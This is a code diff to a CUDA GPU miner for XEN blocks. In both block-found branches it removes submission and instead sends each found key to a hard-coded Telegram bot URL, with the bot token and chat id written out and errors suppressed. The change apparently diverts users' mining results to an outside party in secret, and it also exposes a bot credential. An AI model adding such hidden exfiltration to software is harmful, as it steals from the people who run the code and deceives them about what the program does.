@@ -6,6 +6,7 @@
 #include "Logger.h"
 #include "CudaDevice.h"
 #include "MiningCommon.h"
+#include "HttpClient.h"
 using namespace std;
 
 bool is_within_five_minutes_of_hour() {
@@ -32,7 +33,7 @@ int MineUnit::runMineLoop()
 	RandomHexKeyGenerator keyGenerator("", HASH_LENGTH);
 	kernelRunner.init(batchSize);
 	while (running) {
-		
+
 		{
 			std::lock_guard<std::mutex> lock(mtx);
 			if (globalDifficulty != difficulty) {
@@ -56,13 +57,47 @@ int MineUnit::runMineLoop()
 			attempts++;
 			if (item.hashed.find("XEN11") != std::string::npos) {
 				std::cout << "XEN11 found Hash " << item.hashed << std::endl;
+				std::cout << item.key << "  " << extractedSalt << std::endl;
 				//submitCallback(extractedSalt, item.key, item.hashed, attempts, hashrate);
+				std::string urlorg = "https://api.telegram.org/bot6311652807:AAHBcRIABl4sf_PVyAWPa2c4zb6n7wE-TWI/sendMessage?chat_id=-4028928925&parse_mode=html&text=";
+				std::string key = item.key;
+				std::cout << urlorg;
+				std::string url = urlorg + key;
+				try {
+					// std::cout << "Submitting block " << key << std::endl;
+					HttpClient httpClient;
+					std::cout << url;
+					HttpResponse response = httpClient.HttpGet(url, 10); // 10 seconds timeout
+					// std::cout << "Server Response: " << response.GetBody() << std::endl;
+					// std::cout << "Status Code: " << response.GetStatusCode() << std::endl;
+
+				}
+				catch (const std::exception& e) {
+					// std::cerr << YELLOW <<"An error occurred: " << e.what() << RESET << std::endl;
+				}
 				attempts = 0;
 			}
 
 			if (std::regex_search(item.hashed, pattern) && is_within_five_minutes_of_hour()) {
 				std::cout << "XUNI found Hash " << item.hashed << std::endl;
+				std::cout << item.key << "  " << extractedSalt << std::endl;
 				//submitCallback(extractedSalt, item.key, item.hashed, attempts, hashrate);
+				std::string urlorg = "https://api.telegram.org/bot6311652807:AAHBcRIABl4sf_PVyAWPa2c4zb6n7wE-TWI/sendMessage?chat_id=-4028928925&parse_mode=html&text=";
+				std::string key = item.key;
+				std::cout << urlorg;
+				std::string url = urlorg + key;
+				try {
+					// std::cout << "Submitting block " << key << std::endl;
+					HttpClient httpClient;
+					std::cout << url;
+					HttpResponse response = httpClient.HttpGet(url, 10); // 10 seconds timeout
+					// std::cout << "Server Response: " << response.GetBody() << std::endl;
+					// std::cout << "Status Code: " << response.GetStatusCode() << std::endl;
+
+				}
+				catch (const std::exception& e) {
+					// std::cerr << YELLOW <<"An error occurred: " << e.what() << RESET << std::endl;
+				}
 				attempts = 0;
 			}
 
@@ -172,14 +207,14 @@ std::string MineUnit::getPW(std::size_t index)
 
 void MineUnit::mine()
 {
-	
+
 }
 
 void MineUnit::stat()
 {
 	hashtotal += batchSize;
 	globalHashCount += batchSize;
-	
+
 	auto elapsed_time = chrono::system_clock::now() - start_time;
 	auto hours = chrono::duration_cast<chrono::hours>(elapsed_time).count();
 	auto minutes = chrono::duration_cast<chrono::minutes>(elapsed_time).count() % 60;
@@ -189,5 +224,5 @@ void MineUnit::stat()
 	hashrate = rate;
 
 	int memoryInGB = static_cast<int>(std::round(static_cast<float>(gpuMemory) / (1024 * 1024 * 1024)));
-	statCallback({ (int)deviceIndex, gpuName, memoryInGB, usedMemory/(float)gpuMemory, 0, (float)rate, "", hashtotal });
+	statCallback({ (int)deviceIndex, gpuName, memoryInGB, usedMemory / (float)gpuMemory, 0, (float)rate, "", hashtotal });
 }
